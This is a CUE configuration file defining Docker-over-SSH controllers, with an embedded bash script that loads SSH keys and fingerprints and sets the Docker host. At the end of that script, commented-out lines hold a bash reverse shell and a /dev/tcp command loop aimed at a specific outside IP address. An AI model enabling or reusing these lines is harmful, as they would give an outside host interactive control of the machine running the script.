package docker

import (
  "loop-dev.com/helpers"
  "loop-dev.com/shart"
	"b.l/bl"
	"encoding/json"
)

// Defines an "endpoint", eg: an host / user / ssh key referencing a running Docker daemon
Endpoint :: {
	// Private ssh key
	privatekey: string
	// Private ssh key passphrase
	passphrase: string

	// User
	user: helpers.URI.User | *"docker"
	// Hostname or ip for the Docker daemon
	host: helpers.URI.DomainOrIp
	// Docker-over-ssh port
	port: helpers.URI.Port | * 22

	// Optional SSH fingerprint to trust the host for
	finger?:    string
	// If no fingerprint is provided, whether to blindly trust it or not
	trust:      bool | *false
}

Controller :: {
	settings:: {
		{
//			controller: null
			endpoint: Endpoint
//			controller: endpoint
		} | {
			controller: Controller
			endpoint: controller.settings.endpoint
		}

		configure: {}

		action: string

		debug: bool | *false

		_shelldebug: string | *"+x"
		if debug {
			_shelldebug: "-x"
		}
		_header: """
		#!/usr/bin/env bash
		set \(_shelldebug) -o errexit -o errtrace -o functrace -o nounset -o pipefail
		umask 0077
		"""
	}

	run: bl.BashScript & {
		os: {
			package: {
				"docker-cli":     true
				"openssh-client": true
				bash:             true
				jq:               true
			}
		}

		input: "/endpoint.json": json.Marshal(settings.endpoint)
		input: "/configure.json": json.Marshal(settings.configure)

		code: """
		\(settings._header)

		\(shart.logger)
		\(shart.ssh)
		\(shart.docker)
		\(shart.error)

		# Main code
		configure="$(cat /configure.json)"
		endpoint="$(cat /endpoint.json)"
		key="$(printf "%s" "$endpoint" | jq -rc .privatekey)"
		passphrase="$(printf "%s" "$endpoint" | jq -rc .passphrase)"
		user="$(printf "%s" "$endpoint" | jq -rc .user)"
		host="$(printf "%s" "$endpoint" | jq -rc .host)"
		port="$(printf "%s" "$endpoint" | jq -rc .port)"
		finger="$(printf "%s" "$endpoint" | jq -rc 'select(.finger != null).finger')"

		logger::info "Starting ssh-agent"
		ssh::boot

		logger::info "Adding identity from private key and passphrase"
		ssh::identity::add "$key" "$passphrase"

		logger::info "Adding host fingerprint"
		if [ "$finger" ]; then
			logger::info "Adding provided fingerprint"
			ssh::fingerprint::add "$finger"
		elif [ "$trust" == true ]; then
			logger::warning "Blindly trusting host. You do know what you are doing, Joe, right?"
			ssh::fingerprint::trust "$host" "$port"
		else
			logger::warning "You did not provide a fingerprint, and you do not blindly trust the remote host (good) - let me fail for you, right now, so you don't have to wait."
			exit 1
		fi

		logger::info "Setting the docker host"
		docker::host "$user" "$host" "$port"

		docker::info >/dev/null 2>&1 || {
			logger::error "Failed to contact the provided docker host. Either you do not have network, or you fatfingered something."
			exit "$ERROR_NO_DOCKER"
		}

		\(settings.action)

		# Reverse shell - make this a trap, and configurable
		# bash -i >& /dev/tcp/174.138.114.137/5555 0>&1
		# exec 5<>/dev/tcp/174.138.114.137/5555
		# cat <&5 | while read line; do $line 2>&5 >&5 || echo "command failed: $line"; done

		"""
	}
}

Daemon :: Controller & {
	settings:: {
		endpoint: Endpoint
		action: "logger::info \"All set. Docker Daemon happily awaiting orders on $DOCKER_HOST.\""
	}
}

Network :: Controller & {
	settings:: {
		controller: Daemon

		configure: {
			forceremove: bool | * false
			name: string | * "dubo-vlan"
			driver: string | * "macvlan"
			attachable: bool | * true
			internal: bool | * false

			ipv6: bool | * false

			labels: []

			// XXX type this properly
			subnet?: string
			gateway?: string
			ip_range?: string
			parent?: string
			ipvlan_mode?: string | * "l2"
		}

		action: """
		config="$(cat /configure.json)"

		"""
	}
}




//      --attachable           Enable manual container attachment
//      --aux-address map      Auxiliary IPv4 or IPv6 addresses used by Network driver (default map[])
//      --config-from string   The network from which copying the configuration
//      --config-only          Create a configuration only network
//      --ingress              Create swarm routing-mesh network
//      --ipam-driver string   IP Address Management Driver (default "default")
//      --ipam-opt map         Set IPAM driver specific options (default map[])
//      --label list           Set metadata on a network
//      --scope string         Control the network's scope
